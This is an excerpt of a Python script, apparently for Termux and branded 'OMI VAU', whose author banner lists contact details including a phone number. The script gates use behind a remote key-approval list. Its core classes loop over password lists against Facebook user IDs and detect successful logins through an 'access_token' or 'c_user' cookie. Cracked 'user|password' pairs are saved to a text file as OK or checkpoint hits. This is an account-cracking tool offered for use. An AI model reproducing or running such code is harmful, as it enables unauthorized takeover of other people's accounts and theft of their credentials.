...
def logo():
	print("""%s
           \033[0;37m oPYo. o     o o 
           \033[1;92m 8    8 8b   d8 8 
           \033[1;93m8    8 8`b d'8 8 
           \033[1;91m 8    8 8 `o' 8 8 
           \033[1;92m 8    8 8     8 8 
           \033[1;93m`YooP' 8     8 8 
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : OMI HASAN        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : OMIdark     \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : OMI HASAN       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801406115895    L \033[1;93m▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100092013160584')
    logo()
    print ('')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/OMIdark/Omivau/main/Approval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        time.sleep(3.5)
        tks = 'Dear%20  OMI VAU,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
        os.system('am start https://wa.me/+8801406115895?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20  OMI-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : DARK DEVIL OMI VAU ");time.sleep (0.03)
    print("             [*]. FACEBOOK   : OMI HASAN");time.sleep (0.03)
    print("             [*]. GITHUB     : OMIdark ");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                print('\r [OK-OMI VAU] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-OMI VAU] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [OMI VAU] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [OK-OMI VAU] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
